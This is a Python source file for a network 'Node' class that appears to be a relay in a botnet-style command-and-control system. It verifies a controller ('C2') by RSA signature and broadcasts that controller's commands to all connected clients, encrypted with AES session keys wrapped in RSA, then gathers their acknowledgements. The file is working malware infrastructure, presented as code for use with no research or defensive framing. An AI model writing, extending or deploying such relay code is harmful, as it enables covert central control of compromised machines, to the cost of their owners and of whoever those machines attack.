import socket
import threading
import logging
import select
import uuid
import json
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from .crypto import Crypto
from .logger import LoggerFormatter

import logging
import sys
import re

class Node:
    def __init__(self, host='127.0.0.1', port=547, debug=True):
        self.host = host
        self.port = port
        self.debug = debug
        self.running = False
        self.peers_commands = ["status"]
        self.clients = {}
        self.clients_lock = threading.Lock()

        # Logger
        self.logger = logging.getLogger("node")
        self.logger.setLevel(logging.DEBUG if debug else logging.WARNING)
        if not self.logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG if debug else logging.WARNING)
            ch.setFormatter(LoggerFormatter())
            self.logger.addHandler(ch)

        # Crypto
        self.crypto = Crypto(debug)
        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        with open("pub.key", "r") as f:
            self.c2_pub = self.crypto.load_public_key(f.read().encode())

        self.node_socket = None

    #  Setup Socket 
    def setup_socket(self):
        self.logger.info(f"starting node on {self.host}:{self.port}")
        try:
            self.node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.node_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.node_socket.bind((self.host, self.port))
            self.node_socket.listen()
            self.running = True
            self.logger.info(f"listening on {self.host}:{self.port}")
        except Exception as e:
            self.logger.error(f"failed to start node: {e}")
            self.running = False

    #  Run node 
    def run(self):
        self.setup_socket()
        if not self.running:
            return
        try:
            while self.running:
                client_socket, addr = self.node_socket.accept()
                self.logger.info(f"new connection from {addr}")
                threading.Thread(target=self.handle_connection, args=(client_socket, addr), daemon=True).start()
        except KeyboardInterrupt:
            self.logger.info("node stopped manually")
        except Exception as e:
            self.logger.error(f"node error: {e}")
        finally:
            self.shutdown()

    #  Verify C2 
    def verify_c2_signature(self, message, signature):
        try:
            self.c2_pub.verify(
                signature,
                message,
                padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
                hashes.SHA256()
            )
            return True
        except InvalidSignature:
            self.logger.error("invalid C2 signature recived")
            return False
        except Exception as e:
            self.logger.error(f"signature error: {e}")
            return False

    #  Handle Client 
    def handle_connection(self, client_socket, addr):
        try:
            # Send node public key
            pubkey_pem = self.crypto.serialize_public_key(self.public_key)
            client_socket.send(len(pubkey_pem).to_bytes(2, 'big') + pubkey_pem)

            # Receive client public key
            key_len_bytes = self.receive_bytes(client_socket, 2)
            if not key_len_bytes:
                return self.disconnect_connection(client_socket, addr)
            key_len = int.from_bytes(key_len_bytes, 'big')

            client_pubkey_pem = self.receive_bytes(client_socket, key_len)
            if not client_pubkey_pem:
                return self.disconnect_connection(client_socket, addr)
            client_pubkey = self.crypto.load_public_key(client_pubkey_pem)
            self.logger.info(f"received public key from {addr}")

            # Store client
            with self.clients_lock:
                client_id = str(uuid.uuid4())[:8]
                self.clients[client_socket] = {"uuid": client_id, "pubkey": client_pubkey}
                self.logger.info(f"stored client {addr}, {client_id}")

            # Check if client is C2
            is_c2 = self.check_c2(client_socket, addr)

            if not is_c2:
                client_socket.settimeout(10)

            # Main loop
            while self.running:
                if is_c2:
                    self.process_c2_messages(client_socket, addr)
                else:
                    threading.Event().wait(1)

        except Exception as e:
            self.logger.warning(f"connection {addr} error: {e}")
        finally:
            self.disconnect_connection(client_socket, addr)

    #  Check C2 
    def check_c2(self, client_socket, addr):
        try:
            client_socket.settimeout(2)
            length_bytes = self.receive_bytes(client_socket, 2)
            client_socket.settimeout(None)
            if not length_bytes:
                return False

            auth_len = int.from_bytes(length_bytes, 'big')
            auth_message = self.receive_bytes(client_socket, auth_len)
            if not auth_message:
                return False

            auth_data = json.loads(auth_message.decode())
            if auth_data.get("role") != "C2":
                return False

            signature = bytes.fromhex(auth_data.get("signature", ""))
            if self.verify_c2_signature(json.dumps({"role": "C2"}).encode(), signature):
                self.logger.info(f"C2 connected: {addr}")
                with self.clients_lock:
                    self.clients.pop(client_socket, None)
                return True

        except socket.timeout:
            self.logger.debug(f"C2 auth timeout {addr}")
        except Exception as e:
            self.logger.debug(f"C2 auth failed {addr}: {e}")
        return False

    #  Process C2 Messages 
    def process_c2_messages(self, client_socket, addr):
        ready = select.select([client_socket], [], [], 1.0)
        if not ready[0]:
            return
        length_bytes = self.receive_bytes(client_socket, 2)
        if not length_bytes:
            return
        msg_len = int.from_bytes(length_bytes, 'big')
        message = self.receive_bytes(client_socket, msg_len)
        if not message:
            return
        sig_len_bytes = self.receive_bytes(client_socket, 2)
        if not sig_len_bytes:
            return
        sig_len = int.from_bytes(sig_len_bytes, 'big')
        signature = self.receive_bytes(client_socket, sig_len)
        if not signature:
            return

        if self.verify_c2_signature(message, signature):
            self.logger.info(f"C2 message: {message.decode()}")
            
            if json.loads(message.decode())["action"] not in self.peers_commands:
                self.send_to_all(message.decode())
                self.logger.info(f"command sent to {len(self.clients)} clients")
        else:
            self.logger.error(f"invalid C2 signature: {message.decode()}")

    #  Disconnect 
    def disconnect_connection(self, client_socket, addr):
        with self.clients_lock:
            self.clients.pop(client_socket, None)
        try:
            client_socket.close()
        except:
            pass
        self.logger.info(f"disconnected {addr}")

    #  Send 
    def send_to_all(self, message):
        with self.clients_lock:
            clients = list(self.clients.items())
        for client_socket, client_data in clients:
            self.send_to(client_socket, message)

    def send_to(self, client_socket, message):
        try:
            with self.clients_lock:
                client_data = self.clients.get(client_socket)
                if not client_data:
                    raise ConnectionError("Client not connected")

            client_pubkey = client_data["pubkey"]
            session_key = self.crypto.generate_aes_key()
            encrypted_msg = self.crypto.aes_encrypt(session_key, message.encode())
            encrypted_session_key = self.crypto.rsa_encrypt(client_pubkey, session_key)

            payload = (
                len(encrypted_session_key).to_bytes(2, 'big') +
                encrypted_session_key +
                len(encrypted_msg).to_bytes(2, 'big') +
                encrypted_msg
            )
            client_socket.sendall(payload)

            ready = select.select([client_socket], [], [], 5.0)
            if not ready[0]:
                raise ConnectionError(f"no ACK from {self.get_address(client_socket)}")

            length_bytes = self.receive_bytes(client_socket, 2)
            if not length_bytes:
                raise ConnectionError(f"no ACK length from {self.get_address(client_socket)}")
            ack_len = int.from_bytes(length_bytes, 'big')

            ack_encrypted = self.receive_bytes(client_socket, ack_len)
            if not ack_encrypted:
                raise ConnectionError(f"no ACK payload from {self.get_address(client_socket)}")

            ack = self.crypto.rsa_decrypt(self.private_key, ack_encrypted).decode()
            self.logger.info(f"ACK from {self.get_address(client_socket)}: {ack}")

        except Exception as e:
            self.logger.warning(f"send failed {self.get_address(client_socket)}: {e}")
            self.disconnect_connection(client_socket, self.get_address(client_socket))

    #  Helpers 
    def receive_bytes(self, sock, n):
        data = b''
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def get_clients(self):
        with self.clients_lock:
            return list(self.clients.items())

    def get_address(self, client):
        try:
            return client.getpeername()
        except:
            return "unknown"

    #  Shutdown 
    def shutdown(self):
        self.logger.info("shutting down node server")
        self.running = False
        with self.clients_lock:
            for client in list(self.clients.keys()):
                try:
                    client.close()
                except:
                    pass
            self.clients.clear()
        if self.node_socket:
            self.node_socket.close()
        self.logger.info("node server shut down")
